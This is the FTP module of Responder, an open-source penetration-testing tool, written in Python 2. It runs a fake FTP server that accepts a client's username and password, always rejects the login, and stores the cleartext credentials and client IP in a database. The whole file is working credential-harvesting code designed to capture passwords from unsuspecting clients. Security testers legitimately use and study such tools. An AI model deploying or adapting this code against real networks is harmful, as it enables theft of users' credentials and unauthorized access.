#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import settings

from utils import *
from SocketServer import BaseRequestHandler
from packets import FTPPacket

class FTP(BaseRequestHandler):
	def handle(self):
		try:
			self.request.send(str(FTPPacket()))
			data = self.request.recv(1024)

			if data[0:4] == "USER":
				User = data[5:].strip()

				Packet = FTPPacket(Code="331",Message="User name okay, need password.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

			if data[0:4] == "PASS":
				Pass = data[5:].strip()

				Packet = FTPPacket(Code="530",Message="User not logged in.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

				SaveToDb({
					'module': 'FTP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': User, 
					'cleartext': Pass, 
					'fullhash': User+':'+Pass
				})

			else:
				Packet = FTPPacket(Code="502",Message="Command not implemented.")
				self.request.send(str(Packet))
				data = self.request.recv(1024)

		except Exception:
			pass